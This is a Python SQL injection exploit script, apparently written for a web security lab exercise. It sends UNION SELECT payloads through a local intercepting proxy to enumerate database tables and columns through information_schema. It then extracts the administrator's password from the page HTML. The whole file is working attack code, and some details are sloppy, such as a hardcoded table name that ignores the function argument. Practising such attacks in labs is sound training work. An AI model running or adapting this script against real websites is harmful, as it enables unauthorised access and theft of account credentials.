import sys
import requests
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

# Get admins credentials

def exploit(url,user_table, cols):
    payload = f"' UNION SELECT {cols[0]}, {cols[1]} FROM {user_table}--"
    r = requests.get(url + payload, verify=False, proxies=proxies)
    if "administrator" in r.text:
        soup = BeautifulSoup(r.text, 'html.parser')
        try:
            admin_passwd = soup.body.find(text="administrator").parent.find_next('td').contents[0]
        except:
            return False
        return admin_passwd
    return False

# Get all columns in user table

def get_column(url, user_table):
    payload = "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_xcgonl'--"
    r = requests.get(url + payload, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    cols = []
    user_col = soup.body.find(text=re.compile(".*username_.*"))
    pass_col = soup.body.find(text=re.compile(".*password_.*"))
    return user_col,pass_col
        
# To get the users table

def get_table(url):
    payload = "' UNION SELECT table_name,NULL FROM information_schema.tables--"
    r = requests.get(url + payload, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    table = soup.body.find(text=re.compile(".*users.*"))
    return table
    
    
    

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[.] Usage %s <url>' % sys.argv[0])
        print('[.] %s www.python.org <url>' % sys.argv[0])
    print("[.] Retrieving users table..")
    user_table = get_table(url)
    if user_table:
        print(f'User table: {user_table}')
        column = get_column(url, user_table)
        if column:
            print(f'[.] Columns in {user_table} are : {column[0]} {column[1]}')
            print(f'[.] Getting admin credentials..')
            admin_passwd = exploit(url, user_table, column)
            if admin_passwd:
                print('[.] Found admin credentials')
                print(f'[.] administrator : {admin_passwd}')
        else:
            print('[.] did not find any username or password columns')
    else:
        print('[.] Did not find any users table')